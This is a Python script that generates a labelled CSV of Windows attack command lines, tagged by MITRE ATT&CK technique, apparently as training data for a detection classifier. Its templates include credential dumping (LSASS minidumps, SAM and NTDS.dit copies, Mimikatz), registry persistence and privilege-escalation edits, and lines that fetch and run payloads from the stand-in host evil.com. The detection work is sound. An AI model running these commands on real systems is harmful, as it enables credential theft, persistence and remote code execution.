import pandas as pd
import random

def generate_booster():
    data = []

    # --- PREVIOUS FIXES (Maintain 100% Recall) ---
    t1129_templates = [
        "Add-Type -TypeDefinition @' [DllImport(\"kernel32.dll\")] public static extern IntPtr LoadLibrary(string dll); '@ -Name 'Win32' -Namespace 'Genos'",
        "[Reflection.Assembly]::LoadFile('C:\\Users\\Public\\{var}.dll')",
        "rundll32.exe {var}.dll, {func}",
        "$dll = [System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform([System.Runtime.InteropServices.OSPlatform]::Windows)",
        "regsvr32.exe /s /u /i:http://evil.com/{var}.sct scrobj.dll",
        "Import-Module -Name 'C:\\Windows\\Temp\\{var}.dll' -Function *",
        "dnx.exe {var}.dll",
        "dotnet {var}.dll",
    ]

    t1087_templates = [
        "net user /domain {user}",
        "Get-ADUser -Filter * | Select-Object Name, SamAccountName",
        "net localgroup administrators",
        "cmd /c 'whoami /groups & whoami /priv'",
        "wmic useraccount get name,sid",
        "dsquery user -name {user}*",
        "quser /server:localhost",
        "Get-LocalUser | Where-Object {{ $_.Enabled -eq $true }}"
    ]

    t1003_templates = [
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {pid} C:\\Windows\\Temp\\lsass.dmp full",
        "procdump.exe -ma lsass.exe {var}.dmp",
        "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv",
        "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\sys.hiv",
        "vssadmin create shadow /for=C:",
        "esentutl.exe /y /v /ss C:\\Windows\\ntds\\ntds.dit /d C:\\Windows\\Temp\\ntds.dit",
        "pypykatz lsa minidump {var}.dmp",
        "Invoke-Mimikatz -Command 'lsadump::sam'"
    ]

    # --- NEW: SYMMETRY / CONTRAST SAMPLES (The Precision Fix) ---
    # Teach the model that rundll32 and reg are NOT always T1003

    # T1546: Event Triggered Execution (Using Reg and RunDll32 for persistence, not dumping)
    t1546_templates = [
        "reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"rundll32.exe C:\\temp\\{var}.dll,Run\"",
        "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v {var} /d \"rundll32.exe {var}.dll,EntryPoint\"",
        "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"{var}_filter\", EventNameSpace=\"root\\cimv2\""
    ]

    # T1566: Phishing / Malicious Attachments (Using RunDll32 to execute a downloaded payload)
    t1566_templates = [
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://evil.com/{var}.sct\")",
        "rundll32.exe url.dll,OpenURL http://evil.com/{var}.exe",
        "cmd.exe /c \"mshTa.exe http://evil.com/payload.hta\""
    ]

    # T1016: System Network Configuration Discovery (Separating from T1087/T1003)
    t1016_templates = [
        "ipconfig /all",
        "arp -a",
        "route print",
        "netsh interface show interface",
        "netstat -ano | findstr LISTENING"
    ]

    # T1112: Modify Registry (General malicious reg edits, not credential dumping)
    t1112_templates = [
        "reg add HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f",
        "reg.exe add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /t REG_SZ /d \"{var}.exe\" /f"
    ]

    vars_list = ["payload", "debug", "test", "svc_helper", "update_cache", "update", "sys_drv"]
    users_list = ["admin", "svc_sql", "backup_user", "it_dept"]

    for _ in range(120): # Generates ~840 total samples
        v = random.choice(vars_list)
        u = random.choice(users_list)
        p = random.randint(400, 9000)
        
        data.append(["T1129", random.choice(t1129_templates).format(var=v, func="Execute")])
        data.append(["T1087", random.choice(t1087_templates).format(user=u)])
        data.append(["T1003", random.choice(t1003_templates).format(pid=p, var=v)])
        data.append(["T1546", random.choice(t1546_templates).format(var=v)])
        data.append(["T1566", random.choice(t1566_templates).format(var=v)])
        data.append(["T1016", random.choice(t1016_templates)])
        data.append(["T1112", random.choice(t1112_templates).format(var=v)])

    df = pd.DataFrame(data, columns=['mitre_id', 'command'])
    df.to_csv('specialist_booster.csv', index=False)
    print(f"[+] Generated {len(df)} surgical and symmetry samples into 'specialist_booster.csv'.")

if __name__ == "__main__":
    generate_booster()